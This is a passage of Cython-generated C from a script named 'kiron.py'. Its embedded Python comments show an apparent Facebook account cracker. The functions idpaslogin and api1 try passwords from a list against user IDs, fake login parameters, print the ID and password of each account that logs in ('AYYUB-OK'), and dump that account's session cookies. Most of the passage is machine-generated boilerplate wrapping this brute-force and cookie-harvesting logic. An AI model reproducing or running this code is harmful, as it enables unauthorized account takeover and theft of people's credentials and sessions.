    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 464, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_9 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_14, __pyx_t_2);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_ErrRestore(__pyx_t_14, __pyx_t_1, __pyx_t_7);
    __pyx_t_14 = 0; __pyx_t_1 = 0; __pyx_t_7 = 0;
    if (__pyx_t_9) {
      __Pyx_AddTraceback("kiron.idpaslogin", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_1, &__pyx_t_14) < 0) __PYX_ERR(0, 464, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_14);

      /* "kiron.py":465
 *             loop+=1
 *         except requests.exceptions.ConnectionError:
 *             time.sleep(10)             # <<<<<<<<<<<<<<
 * #__________________| FILE METHOD M1 |__________________#
 * def api1(ids,names,passlist):
 */
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_time); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 465, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_sleep); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 465, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      __pyx_t_9 = 0;
      #if CYTHON_UNPACK_METHODS
      if (unlikely(PyMethod_Check(__pyx_t_15))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_15);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_15, function);
          __pyx_t_9 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_int_10};
        __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 465, __pyx_L5_except_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      }
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;

    /* "kiron.py":404
 *         global loop,oks,cps
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
 *         try:             # <<<<<<<<<<<<<<
 *             for ps in passlist:
 *                     session = requests.Session()
 */
    __pyx_L5_except_error:;
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_12);
    __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_12);
    __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
    __pyx_L8_try_end:;
  }

  /* "kiron.py":401
 *         linex()
 * #[ RAND MTD NO.1 ]#
 * def idpaslogin(uid,passlist,tl):             # <<<<<<<<<<<<<<
 *         global loop,oks,cps
 *         sys.stdout.write(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-XD\x1b[38;5;244m] \x1b[38;5;244m[\x1b[38;5;81m{loop}\x1b[38;5;244m] \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_AddTraceback("kiron.idpaslogin", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ps);
  __Pyx_XDECREF(__pyx_v_session);
  __Pyx_XDECREF(__pyx_v_free_fb);
  __Pyx_XDECREF(__pyx_v_us);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_head);
  __Pyx_XDECREF(__pyx_v_po);
  __Pyx_XDECREF(__pyx_v_log_cookies);
  __Pyx_XDECREF(__pyx_v_coki);
  __Pyx_XDECREF(__pyx_v_ssbb);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_uidx);
  __Pyx_XDECREF(__pyx_v_ckk);
  __Pyx_XDECREF(__pyx_v_res);
  __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_key);
  __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_value);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":467
 *             time.sleep(10)
 * #__________________| FILE METHOD M1 |__________________#
 * def api1(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id,device
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_29api1(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_29api1 = {"api1", (PyCFunction)(void*)(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_5kiron_29api1, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5kiron_29api1(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
) {
  PyObject *__pyx_v_ids = 0;
  PyObject *__pyx_v_names = 0;
  PyObject *__pyx_v_passlist = 0;
  #if !CYTHON_METH_FASTCALL
  CYTHON_UNUSED Py_ssize_t __pyx_nargs;
  #endif
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject* values[3] = {0,0,0};
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("api1 (wrapper)", 0);
  #if !CYTHON_METH_FASTCALL
  #if CYTHON_ASSUME_SAFE_MACROS
  __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);
  #else
  __pyx_nargs = PyTuple_Size(__pyx_args); if (unlikely(__pyx_nargs < 0)) return NULL;
  #endif
  #endif
  __pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);
  {
    PyObject **__pyx_pyargnames[] = {&__pyx_n_s_ids,&__pyx_n_s_names,&__pyx_n_s_passlist,0};
    if (__pyx_kwds) {
      Py_ssize_t kw_args;
      switch (__pyx_nargs) {
        case  3: values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = __Pyx_NumKwargs_FASTCALL(__pyx_kwds);
      switch (__pyx_nargs) {
        case  0:
        if (likely((values[0] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_ids)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[0]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 467, __pyx_L3_error)
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_names)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[1]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 467, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("api1", 1, 3, 3, 1); __PYX_ERR(0, 467, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_passlist)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[2]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 467, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("api1", 1, 3, 3, 2); __PYX_ERR(0, 467, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        const Py_ssize_t kwd_pos_args = __pyx_nargs;
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values + 0, kwd_pos_args, "api1") < 0)) __PYX_ERR(0, 467, __pyx_L3_error)
      }
    } else if (unlikely(__pyx_nargs != 3)) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
      values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
      values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
    }
    __pyx_v_ids = values[0];
    __pyx_v_names = values[1];
    __pyx_v_passlist = values[2];
  }
  goto __pyx_L6_skip;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("api1", 1, 3, 3, __pyx_nargs); __PYX_ERR(0, 467, __pyx_L3_error)
  __pyx_L6_skip:;
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L3_error:;
  {
    Py_ssize_t __pyx_temp;
    for (__pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {
      __Pyx_Arg_XDECREF_FASTCALL(values[__pyx_temp]);
    }
  }
  __Pyx_AddTraceback("kiron.api1", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5kiron_28api1(__pyx_self, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist);

  /* function exit code */
  {
    Py_ssize_t __pyx_temp;
    for (__pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {
      __Pyx_Arg_XDECREF_FASTCALL(values[__pyx_temp]);
    }
  }
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_5kiron_4api1_2generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "kiron.py":507
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */

static PyObject *__pyx_pf_5kiron_4api1_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr *)__pyx_tp_new_5kiron___pyx_scope_struct_1_genexpr(__pyx_ptype_5kiron___pyx_scope_struct_1_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 507, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_5kiron_4api1_2generator1, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_api1_locals_genexpr, __pyx_n_s_kiron); if (unlikely(!gen)) __PYX_ERR(0, 507, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("kiron.api1.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_5kiron_4api1_2generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr *__pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 507, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 2; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 507, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 507, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_string); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 507, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 507, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_6 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_5};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 507, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 507, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_5kiron_4api1_5generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "kiron.py":551
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])             # <<<<<<<<<<<<<<
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 */

static PyObject *__pyx_pf_5kiron_4api1_3genexpr(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_genexpr_arg_0) {
  struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *)__pyx_tp_new_5kiron___pyx_scope_struct_2_genexpr(__pyx_ptype_5kiron___pyx_scope_struct_2_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 551, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  __pyx_cur_scope->__pyx_genexpr_arg_0 = __pyx_genexpr_arg_0;
  __Pyx_INCREF(__pyx_cur_scope->__pyx_genexpr_arg_0);
  __Pyx_GIVEREF(__pyx_cur_scope->__pyx_genexpr_arg_0);
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_5kiron_4api1_5generator2, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_api1_locals_genexpr, __pyx_n_s_kiron); if (unlikely(!gen)) __PYX_ERR(0, 551, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("kiron.api1.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_5kiron_4api1_5generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *__pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  Py_ssize_t __pyx_t_2;
  PyObject *(*__pyx_t_3)(PyObject *);
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 551, __pyx_L1_error)
  if (unlikely(!__pyx_cur_scope->__pyx_genexpr_arg_0)) { __Pyx_RaiseUnboundLocalError(".0"); __PYX_ERR(0, 551, __pyx_L1_error) }
  if (likely(PyList_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) || PyTuple_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) {
    __pyx_t_1 = __pyx_cur_scope->__pyx_genexpr_arg_0; __Pyx_INCREF(__pyx_t_1);
    __pyx_t_2 = 0;
    __pyx_t_3 = NULL;
  } else {
    __pyx_t_2 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_cur_scope->__pyx_genexpr_arg_0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 551, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 551, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_3)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        {
          Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);
          #if !CYTHON_ASSUME_SAFE_MACROS
          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 551, __pyx_L1_error)
          #endif
          if (__pyx_t_2 >= __pyx_temp) break;
        }
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_2); __Pyx_INCREF(__pyx_t_4); __pyx_t_2++; if (unlikely((0 < 0))) __PYX_ERR(0, 551, __pyx_L1_error)
        #else
        __pyx_t_4 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_2); __pyx_t_2++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 551, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        {
          Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);
          #if !CYTHON_ASSUME_SAFE_MACROS
          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 551, __pyx_L1_error)
          #endif
          if (__pyx_t_2 >= __pyx_temp) break;
        }
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_2); __Pyx_INCREF(__pyx_t_4); __pyx_t_2++; if (unlikely((0 < 0))) __PYX_ERR(0, 551, __pyx_L1_error)
        #else
        __pyx_t_4 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_2); __pyx_t_2++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 551, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_3(__pyx_t_1);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 551, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_cur_scope->__pyx_v_i, __pyx_n_s_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 551, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__72); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 551, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_cur_scope->__pyx_v_i, __pyx_n_s_value); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 551, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 551, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_r = __pyx_t_6;
    __pyx_t_6 = 0;
    __Pyx_XGIVEREF(__pyx_t_1);
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __pyx_cur_scope->__pyx_t_1 = __pyx_t_2;
    __pyx_cur_scope->__pyx_t_2 = __pyx_t_3;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    __pyx_cur_scope->__pyx_t_0 = 0;
    __Pyx_XGOTREF(__pyx_t_1);
    __pyx_t_2 = __pyx_cur_scope->__pyx_t_1;
    __pyx_t_3 = __pyx_cur_scope->__pyx_t_2;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 551, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
